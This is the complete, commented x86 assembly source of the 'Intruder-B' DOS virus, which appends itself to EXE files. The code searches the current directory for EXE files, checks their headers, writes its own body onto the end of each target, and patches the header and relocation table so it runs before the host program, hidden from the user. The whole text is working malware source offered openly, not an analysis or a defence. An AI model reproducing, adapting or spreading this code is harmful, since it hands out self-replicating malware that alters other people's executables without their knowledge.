;The Intruder-B Virus is an EXE file infector which stays put in one directory.
;It attaches itself to the end of a file and modifies the EXE file header so
;that it gets control first, before the host program. When it is done doing
;its job, it passes control to the host program, so that the host executes
;without a hint that the virus is there.


        .SEQ                       ;segments must appear in sequential order
                                   ;to simulate conditions in actual active virus

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file.
HOSTSEG SEGMENT BYTE
        ASSUME  CS:HOSTSEG,SS:HSTACK

;This host simply terminates and returns control to DOS.
HOST:
        mov     ax,4C00H
        int     21H             ;terminate normally
HOSTSEG ENDS

;Host program stack segment
STACKSIZE       EQU     100H           ;size of stack for this program

HSTACK  SEGMENT PARA STACK 'STACK'
        db  STACKSIZE dup (?)
HSTACK  ENDS

;************************************************************************
;This is the virus itself

NUMRELS         EQU     2              ;number of relocatables in the virus

;Intruder Virus code segment. This gains control first, before the host. As this
;ASM file is layed out, this program will look exactly like a simple program
;that was infected by the virus.

VSEG    SEGMENT PARA
        ASSUME  CS:VSEG,DS:VSEG,SS:HSTACK

;Data storage area
DTA     DB      2BH dup (?)           ;new disk transfer area
EXE_HDR DB      1CH dup (?)           ;buffer for EXE file header
EXEFILE DB      '*.EXE',0             ;search string for an exe file

;The following 10 bytes must stay together because they are an image of 10
;bytes from the EXE header
HOSTS   DW      HOSTSEG,STACKSIZE     ;host stack and code segments
FILLER  DW      ?                     ;these are hard-coded 1st generation
HOSTC   DW      0,HOSTSEG             ;Use HOSTSEG for HOSTS, not HSTACK to fool A86


;Main routine starts here. This is where cs:ip will be initialized to.
VIRUS:
        push    ax              ;save startup info in ax
        push    cs
        pop     ds              ;set ds=cs
        mov     ah,1AH          ;set up a new DTA location
        mov     dx,OFFSET DTA   ;for viral use
        int     21H
        call    FINDEXE         ;get an exe file to attack
        jc      FINISH          ;returned c - no valid file, exit
        call    INFECT          ;move virus code to file we found
FINISH: push    es
        pop     ds              ;restore ds to PSP
        mov     dx,80H
        mov     ah,1AH          ;restore DTA to PSP:80H for host
        int     21H
        pop     ax              ;restore startup value of ax
        cli
        mov     ss,WORD PTR cs:[HOSTS]  ;set up host stack properly
        mov     sp,WORD PTR cs:[HOSTS+2]
        sti
        jmp     DWORD PTR cs:[HOSTC]   ;begin execution of host program


;This function searches the current directory for an EXE file which passes
;the test FILE_OK. This routine will return the EXE name in the DTA, with the
;file open, and the c flag reset, if it is successful. Otherwise, it will
;return with the c flag set. It will search a whole directory before giving up.
FINDEXE:
        mov     dx,OFFSET EXEFILE
        mov     cx,3FH          ;search first for any file *.EXE
        mov     ah,4EH
        int     21H
NEXTE:  jc      FEX             ;is DOS return OK? if not, quit with c set
        call    FILE_OK         ;yes - is this a good file to use?
        jnc     FEX             ;yes - valid file found - exit with c reset
        mov     ah,4FH
        int     21H             ;do find next
        jmp     SHORT NEXTE     ;and go test it for validity
FEX:    ret                     ;return with c set properly


;Function to determine whether the EXE file found by the search routine is
;useable. If so return nc, else return c
;What makes an EXE file useable?:
;              a) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              b) The Overlay Number field in the EXE header must be zero.
;              c) It should be a DOS EXE, without Windows or OS/2 extensions.
;              d) There must be room in the relocatable table for NUMRELS
;                 more relocatables without enlarging it.
;              e) The initial ip stored in the EXE header must be different
;                 than the viral initial ip. If they're the same, the virus
;                 is probably already in that file, so we skip it.
;
FILE_OK:
        mov     dx,OFFSET DTA+1EH
        mov     ax,3D02H               ;r/w access open file
        int     21H
        jc      OK_END1                ;error opening - C set - quit without closing
        mov     bx,ax                  ;put handle into bx and leave bx alone from here on out
        mov     cx,1CH                 ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR      ;into this buffer
        mov     ah,3FH                 ;for examination and modification
        int     21H
        jc      OK_END                 ;error in reading the file, so quit
        cmp     WORD PTR [EXE_HDR],'ZM';check EXE signature of MZ
        jnz     OK_END                 ;close & exit if not
        cmp     WORD PTR [EXE_HDR+26],0;check overlay number
        jnz     OK_END                 ;not 0 - exit with c set
        cmp     WORD PTR [EXE_HDR+24],40H ;is rel table at offset 40H or more?
        jnc     OK_END                 ;yes, it is not a DOS EXE, so skip it
        call    REL_ROOM               ;is there room in the relocatable table?
        jc      OK_END                 ;no - exit
        cmp     WORD PTR [EXE_HDR+14H],OFFSET VIRUS  ;see if initial ip = virus initial ip
        clc
        jne     OK_END1                ;if all successful, leave file open
OK_END: mov     ah,3EH                 ;else close the file
        int     21H
        stc                            ;set carry to indicate file not ok
OK_END1:ret                            ;return with c flag set properly


;This function determines if there are at least NUMRELS openings in the
;relocatable table for the file. If there are, it returns with carry reset,
;otherwise it returns with carry set. The computation this routine does is
;to compare whether
;    ((Header Size * 4) + Number of Relocatables) * 4 - Start of Rel Table
;is >= than 4 * NUMRELS. If it is, then there is enough room
;
REL_ROOM:
        mov     ax,WORD PTR [EXE_HDR+8] ;size of header, paragraphs
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+6] ;number of relocatables
        add     ax,ax
        add     ax,ax
        sub     ax,WORD PTR [EXE_HDR+24] ;start of relocatable table
        cmp     ax,4*NUMRELS            ;enough room to put relocatables in?
        ret                             ;exit with carry set properly


;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header and two relocatables in the program, so that
;it will work in the new environment. It also makes sure the virus starts
;on a paragraph boundary, and adds how many bytes are necessary to do that.
INFECT:
        mov     cx,WORD PTR [DTA+1CH]   ;adjust file length to paragraph
        mov     dx,WORD PTR [DTA+1AH]   ;boundary
        or      dl,0FH
        add     dx,1
        adc     cx,0
        mov     WORD PTR [DTA+1CH],cx
        mov     WORD PTR [DTA+1AH],dx
        mov     ax,4200H                ;set file pointer, relative to beginning
        int     21H                     ;go to end of file + boundary

        mov     cx,OFFSET FINAL         ;last byte of code
        xor     dx,dx                   ;first byte of code, ds:dx
        mov     ah,40H                  ;write body of virus to file
        int     21H

        mov     dx,WORD PTR [DTA+1AH]   ;find relocatables in code
        mov     cx,WORD PTR [DTA+1CH]   ;original end of file
        add     dx,OFFSET HOSTS         ;            + offset of HOSTS
        adc     cx,0                    ;cx:dx is that number
        mov     ax,4200H                ;set file pointer to 1st relocatable
        int     21H
        mov     dx,OFFSET EXE_HDR+14    ;get correct host ss:sp, cs:ip
        mov     cx,10
        mov     ah,40H                  ;and write it to HOSTS/HOSTC
        int     21H

        xor     cx,cx                   ;so now adjust the EXE header values
        xor     dx,dx
        mov     ax,4200H                ;set file pointer to start of file
        int     21H

        mov     ax,WORD PTR [DTA+1AH]   ;calculate viral initial CS
        mov     dx,WORD PTR [DTA+1CH]   ; = File size / 16 - Header Size(Para)
        mov     cx,16
        div     cx                      ;dx:ax contains file size / 16
        sub     ax,WORD PTR [EXE_HDR+8] ;subtract exe header size, in paragraphs
        mov     WORD PTR [EXE_HDR+22],ax;save as initial CS
        mov     WORD PTR [EXE_HDR+14],ax;save as initial SS
        mov     WORD PTR [EXE_HDR+20],OFFSET VIRUS  ;save initial ip
        mov     WORD PTR [EXE_HDR+16],OFFSET FINAL + STACKSIZE  ;save initial sp

        mov     dx,WORD PTR [DTA+1CH]   ;calculate new file size for header
        mov     ax,WORD PTR [DTA+1AH]   ;get original size
        add     ax,OFFSET FINAL + 200H  ;add virus size + 1 paragraph, 512 bytes
        adc     dx,0
        mov     cx,200H                 ;divide by paragraph size
        div     cx                      ;ax=paragraphs, dx=last paragraph size
        mov     WORD PTR [EXE_HDR+4],ax ;and save paragraphs here
        mov     WORD PTR [EXE_HDR+2],dx ;last paragraph size here
        add     WORD PTR [EXE_HDR+6],NUMRELS    ;adjust relocatables counter
        mov     cx,1CH                  ;and save 1CH bytes of header
        mov     dx,OFFSET EXE_HDR       ;at start of file
        mov     ah,40H
        int     21H
                                        ;now modify relocatables table
        mov     ax,WORD PTR [EXE_HDR+6] ;get number of relocatables in table
        dec     ax                      ;in order to calculate location of
        dec     ax                      ;where to add relocatables
        mov     cx,4                    ;Location= (No in table-2)*4+Table Offset
        mul     cx
        add     ax,WORD PTR [EXE_HDR+24];table offset
        adc     dx,0
        mov     cx,dx
        mov     dx,ax
        mov     ax,4200H                ;set file pointer to table end
        int     21H

        mov     WORD PTR [EXE_HDR],OFFSET HOSTS    ;use EXE_HDR as buffer
        mov     ax,WORD PTR [EXE_HDR+22]           ;and set up 2 pointers to file
        mov     WORD PTR [EXE_HDR+2],ax            ;1st points to ss in HOSTS
        mov     WORD PTR [EXE_HDR+4],OFFSET HOSTC+2
        mov     WORD PTR [EXE_HDR+6],ax            ;second to cs in HOSTC
        mov     cx,8                    ;ok, write 8 bytes of data
        mov     dx,OFFSET EXE_HDR
        mov     ah,40H                  ;DOS write function
        int     21H
        mov     ah,3EH                  ;close file now
        int     21H
        ret                             ;that's it, infection is complete!

FINAL:                                  ;label for end of virus

VSEG    ENDS

        END VIRUS               ;Entry point is the virus
